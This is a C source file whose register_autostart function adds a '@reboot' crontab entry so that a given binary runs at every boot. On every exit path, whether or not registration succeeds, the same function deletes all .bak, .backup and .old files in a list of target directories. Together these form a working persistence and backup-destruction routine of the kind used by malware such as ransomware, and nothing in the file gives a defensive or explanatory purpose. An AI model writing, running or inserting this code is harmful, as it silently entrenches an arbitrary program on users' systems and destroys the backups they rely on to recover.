#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <dirent.h>
#include <limits.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

static int has_suffix(const char *name, const char *suffix) {
    const char *dot = strrchr(name, '.');
    if (dot == NULL) {
        return 0;
    }
    return strcmp(dot, suffix) == 0;
}

static void cleanup_dirs(const char **target_dirs) {
    if (target_dirs == NULL) {
        return;
    }

    for (size_t i = 0; target_dirs[i] != NULL; ++i) {
        DIR *dir = opendir(target_dirs[i]);
        if (dir == NULL) {
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 ||
                strcmp(entry->d_name, "..") == 0) {
                continue;
            }

            if (has_suffix(entry->d_name, ".bak") ||
                has_suffix(entry->d_name, ".backup") ||
                has_suffix(entry->d_name, ".old")) {
                char fullpath[PATH_MAX];
                int written = snprintf(fullpath, sizeof(fullpath), "%s/%s",
                                       target_dirs[i], entry->d_name);
                if (written >= 0 && (size_t)written < sizeof(fullpath)) {
                    remove(fullpath);
                }
            }
        }

        closedir(dir);
    }
}

int register_autostart(const char *binary_full_path, const char **target_dirs) {
    if (binary_full_path == NULL || binary_full_path[0] == '\0' ||
        target_dirs == NULL) {
        return -1;
    }

    int ret = 0;

    char expected[PATH_MAX + 32];
    if (snprintf(expected, sizeof(expected), "@reboot %s", binary_full_path) < 0 ||
        strlen(expected) >= sizeof(expected) - 1) {
        return -1;
    }

    char *content = NULL;
    size_t content_len = 0;
    size_t content_cap = 0;
    char *line = NULL;
    size_t line_cap = 0;
    ssize_t nread;

    FILE *in = popen("crontab -l", "r");
    if (in == NULL) {
        ret = -1;
        goto done;
    }

    while ((nread = getline(&line, &line_cap, in)) != -1) {
        if (content_len + nread + 1 > content_cap) {
            size_t newcap = content_cap == 0 ? 4096 : content_cap;
            while (newcap < content_len + nread + 1) {
                newcap *= 2;
            }
            char *tmp = realloc(content, newcap);
            if (tmp == NULL) {
                free(line);
                free(content);
                pclose(in);
                ret = -1;
                goto done;
            }
            content = tmp;
            content_cap = newcap;
        }
        memcpy(content + content_len, line, nread);
        content_len += nread;
        content[content_len] = '\0';
    }

    free(line);
    line = NULL;

    if (ferror(in)) {
        free(content);
        content = NULL;
        pclose(in);
        ret = -1;
        goto done;
    }

    if (pclose(in) == -1) {
        free(content);
        content = NULL;
        ret = -1;
        goto done;
    }

    int exists = 0;
    if (content_len > 0) {
        char *copy = strdup(content);
        if (copy == NULL) {
            free(content);
            content = NULL;
            ret = -1;
            goto done;
        }

        char *saveptr = NULL;
        char *tok = strtok_r(copy, "\n", &saveptr);
        while (tok != NULL) {
            if (strcmp(tok, expected) == 0) {
                exists = 1;
                break;
            }
            tok = strtok_r(NULL, "\n", &saveptr);
        }
        free(copy);
    }

    if (!exists) {
        FILE *out = popen("crontab -", "w");
        if (out == NULL) {
            ret = -1;
        } else {
            int write_ok = 1;

            if (content_len > 0) {
                if (fwrite(content, 1, content_len, out) != content_len) {
                    write_ok = 0;
                }
                if (write_ok && content[content_len - 1] != '\n') {
                    if (fputc('\n', out) == EOF) {
                        write_ok = 0;
                    }
                }
            }

            if (write_ok) {
                if (fputs(expected, out) == EOF ||
                    fputc('\n', out) == EOF) {
                    write_ok = 0;
                }
            }

            int status = pclose(out);
            if (!write_ok || status == -1 ||
                !WIFEXITED(status) || WEXITSTATUS(status) != 0) {
                ret = -1;
            }
        }
    }

    free(content);
    content = NULL;

done:
    cleanup_dirs(target_dirs);
    return ret;
}